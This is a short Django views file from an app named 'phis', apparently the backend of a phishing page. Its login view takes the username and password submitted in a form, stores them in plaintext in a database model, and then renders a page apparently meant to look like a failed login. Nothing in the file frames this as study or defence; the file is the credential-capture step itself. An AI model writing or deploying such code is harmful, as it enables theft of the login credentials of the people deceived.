from random import Random
from django.shortcuts import render,redirect
from phis.models import login_det
# Create your views here.
def succ(request):
    return render(request, 'success.html')
def login(request):
    if request.method == 'POST':
        usern = request.POST.get('Username', '')
        passw = request.POST.get('Password', '')
        lg = login_det(username=usern,password=passw)
        lg.save()
        redirect('/')
    else:
        redirect('/Account/Login')
    
    
    return render(request, 'niet_login.html')